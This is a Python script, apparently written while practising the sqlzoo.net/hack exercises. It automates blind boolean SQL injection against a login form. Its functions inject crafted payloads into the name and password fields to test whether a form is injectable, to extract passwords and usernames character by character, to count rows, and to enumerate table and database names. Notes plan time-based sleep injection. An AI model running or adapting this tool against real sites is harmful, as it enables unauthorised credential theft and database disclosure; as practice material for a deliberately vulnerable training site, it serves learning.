import requests
import math

def checkPasswordCharacter(character, username, url, index = "no index"):
   """checks for character(s) at specified location in the password 

   Args:
      index: integer representing the location in the password string to check for character
         if a negative integer, will count from end of string, e.g. -1 is last character in the string
         default value is for no index specified, will pad with arbitrary characters

      username: username associated with password being checked for character

      url: url of the username & password form
      
      character: a single character or group of characters to check

   Returns: 
      bool: boolean
         true iff character is found at index in the password string
         if index = "no index" then it returns true iff character is in the password for user username

   Raises:
      tbd -- needs to be updated later!

      from the quick start guide:
         Errors and Exceptions
            
         In the event of a network problem (e.g. DNS failure, refused connection, etc), Requests will raise a ConnectionError exception.
         
         Response.raise_for_status() will raise an HTTPError if the HTTP request returned an unsuccessful status code.
         
         If a request times out, a Timeout exception is raised.
         
         If a request exceeds the configured number of maximum redirections, a TooManyRedirects exception is raised.
         
         All exceptions that Requests explicitly raises inherit from requests.exceptions.RequestException.
   """
   payload = constructPasswordPayload(character, username, index)
   query = sendQuery(payload, url)
   return readQuery(query)


def sendQuery(payload, url):
   """take an url and opens an http connection with payload as a parameter

   Args:
      payload: dictionary
         keys are names of elements in form -- name and password
         values are submission for that element of the form
      
      url: string
         base url to the form being submitted

   Returns:
      text result from the form submission

   Raises:
      tbd

   """

   r = requests.get(url, params = payload)
   return r.text

def readQuery(query):
   """ reads the html returned by the query and determines if login was successful

   Args:
      query: String
         html result of a form submission -- from sqlzoo.net/hack

      username: String
         username of login attempt

   Returns: boolean
      true iff login was successful

   Raises: tbd

   """
   # return username in query #fails! Jake is returned regardless of who's logging in unless whole password is entered correctly!
   return "Welcome" in query
   # should say:
   # "Welcome jake you are now logged in!
   # Log out"
   # if succesful


def constructPasswordPayload(character, username, index = "no index"):
   """

   Args:
      index: integer 
         represents the location of character in the password string encoded
         if a negative integer, will count from end of string, e.g. -1 is last character in the string
         default value is for no index specified, will pad with arbitrary characters

      character: character(s) in password to check for username

      username: username associated with password

   Returns: 
      payload: dictionary
         form parameters as keys and data to submit as values
         keys are username and password

   """

   sqlQuery = constructSQLQuery(character, username, index)

   dikt = {"name" : sqlQuery, "password" : sqlQuery}

   return dikt;


def constructSQLQuery(character, username, index = "no index"):
   """makes SQL query for constructPasswordPayload.
      
      Another helper function, see documentation for constructPasswordPayload

   """

   # the LIKE command uses % and _ as wildcards. % for arbitrary characters(0 to n), _ for one. 
   # Looks like this is not MS access. Using * instead of % does not work, which makes sense.
   # https://www.w3schools.com/SQL/sql_like.asp
   # https://www.w3schools.com/sql/sql_wildcards.asp

   sqlQuery = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password LIKE '" 


   # No! make a password string in this if elif else block and concatonate that string at the end of sqlQuery

   passStr = ""

   if(index == "no index"):
      passStr += "%" + character + "%"

   elif(index == 0):
      passStr += character + "%"

    #len(padding) = index; all "_" characters
      
   elif(index >= 0):
      padding = "_" * index
      passStr = padding + character + "%"

   else:
      index   = -1 * index -1 # so index is non-negative; -1 since end is -1 and begining is 0 not 1. 
      padding = "_" * index
      passStr = "%" + character + padding

   sqlQuery += passStr + "') AND ''='"

   return sqlQuery;


def testPassword(password, username, url):
   """
   Tests a hypothetical password for a given username.

   Args:
      password: string
         hypothetical password
      username: string
         username
      url:
         url of the username and password form

   Returns: 
      boolean
         true iff username and password pair is valid and correct. 

   Raises:
      tbd

   """

   # payload = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password = '" + password + "') AND ''='"
   #this won't work!

   payload = {"name" : username, "password" : password}

   r = sendQuery(payload, url)

   # return readQuery(r, username);
   return username in r #since I changed readQuery



# implement this stuff next time
# https://sqlzoo.net/hack/20user.htm


def nUsers(n, table, url):
   """
   returns the number of users in the password table, ie with login details

   Args:
      n: integer
         will only check up to 2 raised to the nth power


   Returns:
      n: integer
         returns number of users in password table

   Raises:
      ValueError: if 2 to the nth power is less than the number of users in the password table


   """
   if(n < 0): #base case
      return 0 #either negative n in arg or less than one entry found
   if(lessThanAEntries(2**n, table, url)): #recursive case
      return nUsers(2**(n-1), table, url) #recursive call shrinks towards -1/2 (2**-1)
   if(aEntries(2**n, table, url)): #base case
      return 2**n 
   else: #between n and 2n, so use binary search
      return binarySearch(2**n, 2**(n+1), table, url)
   
   # I think it gets stuck if n is too small? Take the ceiling instead of using // in binarySearch?
   

def binarySearch(a, b, table, url):
   """helper function.
   searches range (n,2n) ((exlusive!))

   a and b are end points of the search space

   Let m be the inital a value 
   Recall that m is 2 to the nth power for some integer n > 0.
   By definition, m is an even integer.
   It follows that m/2 = k for some integer k.
   """
   # n = (a + b)//2 # floor of the midpoint, ie integer division (// instead of / for float division)
   n = math.ceil((a + b)/2)
   if(lessThanAEntries(n, table, url)):
      return binarySearch(a, n, table, url)
   if(aEntries(n, table, url)):
      return n #found it
   if(n == b): # since n is not correct, and b is the larger end of this range, the n arg for nUsers is too small
# could move this up to optimize network usage, since inital a and b will be checked already b4 binary search is started!
      raise ValueError("Too many entries for given n. Need to use a bigger n!")
   else:
      return binarySearch(n, b, table, url)

"""
manual tests of binary search. Not as good as unit tests but still useful!
binarySearch fails when a == n (which is an input it wasn't designed for so no surprise)
binarySearch works when b < n (which is an input it was designed for so no surprise) -- should raise a ValueError and does!
binarySearch works when a and b are floats(eg 2.5, 16.12) (which is an input it wasn't designed for so nice little surprise)
binarySearch fails when a > b (which is an input it wasn't designed for so no surprise)
failures are loops that end when ended by the user or (presumably) when resources are exhausted. 
"""



def lessThanAEntries(a, table, url):
   """
   returns true if less than a entries are in the table

   Args:
      a: integer

      table: string
         name of table

      url: string
         url of form

   Returns
      mhm: boolean
         true if greater than a entries are found in table
   
   """

   payload = "' OR (SELECT COUNT(*) FROM " + table + ") < " + str(a) + " AND ''='"
   payload = {"name" : payload, "password" : payload}
   txt = sendQuery(payload, url)
   mhm = readQuery(txt)
   return mhm 


def aEntries(a, table, url):
   """
   returns true if a entries are in the table

   Args:
      a: integer

      table: string
         name of table

      url: string
         url of form

   Returns
      mhm: boolean
         true if exactly a entries are found in table
   
   """

   payload = "' OR (SELECT COUNT(*) FROM " + table + ") = " + str(a) + " AND ''='"
   payload = {"name" : payload, "password" : payload}
   txt = sendQuery(payload, url)
   mhm = readQuery(txt)
   return mhm 

def checkUsername(username, url, tableName):
   """

   """
   payload = "' OR EXISTS(SELECT * FROM " + tableName + " WHERE "
   payload += "name = '" + ch + "') AND ''='"
   payload = {"name" : payload, "password" : payload}
   txt = sendQuery(payload, url)
   mhm = readQuery(txt)
   return mhm

def userNameLike(ch, url, tableName, notLike = False, notLikeName = ""):
   """

   Args: 
      ch: String
         string to check for matches in user table. e.g. r matches Rob, Karen, J.R.R. Tolkien  
      url: String
         string of url to form
      tableName: String
         name of table containing usernames
      notLike: Boolean
         If set to true, will include a name does not equal notLikeName clause
      notLikeName: string
         name to exclude from query

   Returns:
      mhm: boolean
         true if ch matches a username string in the users table 

   """
   payload = "' OR EXISTS(SELECT * FROM " + tableName + " WHERE "
   if(notLike):
      payload += "name!= '" + notLikeName + "' AND "
   payload += "name LIKE '%" + ch + "%') AND ''='"
   payload = {"name" : payload, "password" : payload}
   txt = sendQuery(payload, url)
   mhm = readQuery(txt)
   return mhm

def checkUsernameCharacter(ch, url, tableName,  notLike = False, notLikeName = "", index = "no index"):
   """checks for character(s) at specified location in any username in table

   Args:
      index: integer representing the location in the username to check for ch
         if a negative integer, will count from end of string, e.g. -1 is last character in the string
         default value is for no index specified, will pad with arbitrary characters

      tableName: string
         table storing usernames

      url: url of the vulnerable form
      
      ch: a single character or group of characters to check

      notLike: boolean

      notLikeName: String

   Returns: 
      mhm: boolean
         true if character is found at index for one or more usernames
         if index = "no index" then it returns true iff character is in the password some user

   Raises:
      ValueError: invalid index
   """

   if(index == "no index"):
      pass # don't change ch
   elif(index >= 0):
      ch = index * "_" + ch
   elif(index < 0):
      index = -1 * index -1 # so index is non-negative; -1 since end is -1 and begining is 0 not 1. 
      ch += index * "_"
   else:
      raise ValueError("invalid index")
   return userNameLike(ch, url, tableName, notLike, notLikeName)

def payloadDictionary(payload, lst):
   """creates payload dictionary.
      
      Args:
         payload: String
            SQL query
         lst: List of Strings
            keywords for payload dictionary

      Returns: 
         dikt: dictionary
            dictionary using elements of lst as keys and payload as value for each key  
   """
   dikt = {}
   for i in lst:
      dikt[i] = payload
   return dikt

def NamePasswordDictionary(payload, username, password):
   """ wrapper for payloadDictionary   """
   lst = [username, password]
   return payloadDictionary(payload, lst)

def isVulnerable(url):
   """returns true if site is vulnerable to sql injections. Customize parser function (readQuery) to work for other sites.

   Args:
      url: string
         url of potentially vulnerable form

   Returns:
      boolean: true if found to be vulnerable to SQL injection vulnerabilities

   """
   payload = "' OR ''='"
   payload = NamePasswordDictionary(payload, "name", "password")
   txt = sendQuery(payload, url)
   mhm = readQuery(txt)
   return mhm

def characterInTableName(ch, url, index = "no index"): #track
   """
   https://sqlzoo.net/hack/24table.htm
   Is there a table called one in database test?
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME='one') AND ''='"

   Args:

   Returns:
      mhm: boolean
         true if ch matches at least one table name at index  

"""
   payload = constructTableQuery(ch, index)
   payload = NamePasswordDictionary(payload, "name", "password")
   txt = sendQuery(payload, url)
   mhm = readQuery(txt)
   return mhm


def constructTableQuery(ch, index):
   """helper function for characterInTableName"""
   payload = "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME LIKE '"

   tableStr = ""

   if(index == "no index"):
      tableStr += "%" + ch + "%"
   elif(index >= 0):
      tableStr += index * "_" + ch + "%"
   else:
      index *=  -1 
      index -= 1
      tableStr += "%" + ch + "_" * index 

   payload += tableStr + "') AND ''='" 
   #do I even need the AND ''=' part? it evaluates to '' = '' which is true so true/false AND true? Seems redundant
   return payload

def nTablesMatch(n, ch, url, index = "no index"): 
   # 89 tables with "h", "a", "c"; 2  tables with "k", 112 tables total
   """ how many tables match

   Args:
      n: integer
         largest number of tables to check for matches
      ch: string
         string to check for matching, ie "k" checks how many tables have a "k" in them
      url: string
         url to form
      index: string or integer
         if string, must be default, ie "no index"
         otherwise an integer. Negative integers start from end of string, non-negative integers start from begining. zero is the first character.
   
   Returns:
      N: integer
         if n is greater than or equal to the number of matching tables, returns the number of matching tables. 
         Otherwise prints "nTablesMatch found more than n matches for " + ch, then returns n
   """   
   for i in range(0, n + 1): # Since range(0,k) is 0 1 ... k-2 k-1
      if(not tableMatch(i , ch, url, index)):
         return i# - 1

   print("nTablesMatch found more than n matches for " + ch)
   return n

def tableMatch(n, ch, url, index = "no index"):
   """helper function"""
   payload = "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '"
   
   if(index == "no index"): 
   # could rewrite this as the else statement, would mean anything but a number would act like no index does here
      payload += "%" + ch + "%"
   elif(index < 0):
      index += 1
      index *= -1
      payload += "%" + ch + "_" * index 
   else:
      payload += index * "_" + ch + "%"

   payload += "')>" + str(n) + " AND ''='"
   payload = NamePasswordDictionary(payload, "name", "password")
   txt = sendQuery(payload, url)
   return readQuery(txt)


def characterInDatabaseName(ch, url, index = "no index"): #hack
   """
   
   Args:
      ch: string
         string to match with 
      url:  string
         url of form (to submit SQL query)
      index: integer
         default is check if ch is anywhere in the database name.
         with index set, it checks for a match starting at index. 
         Negative indexes start from end of database name e.g. -2 
         checks if ch starts is two from the end 
         (e.g. if database is called Names, index is -2, and ch is me, should return true) 
   
   Returns:
      mhm: boolean      
         true if ch matches the current database name at ch

   """

   payload = constructDatabaseQuery(ch, index)
   payload = NamePasswordDictionary(payload, "name", "password")
   txt = sendQuery(payload, url)
   mhm = readQuery(txt)
   return mhm

def constructDatabaseQuery(ch, index = "no index"):
   """helper function for characterInDatabaseName"""
   payload = "' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '" 

   nameStr = ""

   if(index == "no index"):
      nameStr += "%" + ch + "%"
   elif(index >= 0):
      nameStr += index * "_" + ch + "%"
   else:
      index = -1 * index -1
      nameStr += "%" + ch + index * "_"

   payload += nameStr + "') AND ''='"
   return payload

"""
links:

https://docs.python.org/3/tutorial/controlflow.html#more-on-defining-functions


"""

def checkTableName():
    pass

def checkDatabaseName():
    pass

def sleep(n, ):
   """

   Args:
      n: integer
         length of time to sleep in microseconds (n thousanths of a milisecond)
   
   """
 
   """
   sleep:
      https://blog.pythian.com/mysql-injection-sleep/
      https://stackoverflow.com/questions/7676164/how-to-wait-for-2-seconds
   elapsed time:
      https://stackoverflow.com/questions/43252542/how-to-measure-server-response-time-for-python-requests-post-request
      https://stackoverflow.com/questions/30442757/measuring-the-http-response-time-with-requests-library-in-python-am-i-doing-it
      https://stackoverflow.com/questions/54619868/http-requests-post-timeout
      https://github.com/psf/requests/blob/v2.21.0/requests/api.py#L34
      https://github.com/psf/requests/blob/v2.21.0/requests/api.py#L116
      https://github.com/psf/requests/blob/v2.21.0/docs/user/quickstart.rst#errors-and-exceptions
      https://stackoverflow.com/questions/11159687/measure-website-load-time-with-python-requests

"""

"""
toDo

   continue implementing functions

   abstract repeated functions into seperate functions: 
   pass parts that don't repeat as functions, which are just regular parameters!!!
   https://stackoverflow.com/questions/1349332/python-passing-a-function-into-another-function#1349350

   make functions that go beyond this database. Things like
      Sleep function
         implement function to see if it sleeps, collect time, measure the time difference
         maybe do some (one sample) t-tests. Say I tell it to sleep for 2 seconds. collect 
         data to show that it's really sleep and not latency?
         Unless I can get the data on just how long the server is taking from getting 
         request to sending response 
            https://newonlinecourses.science.psu.edu/stat414/node/270/
            https://newonlinecourses.science.psu.edu/stat414/node/310/
"""
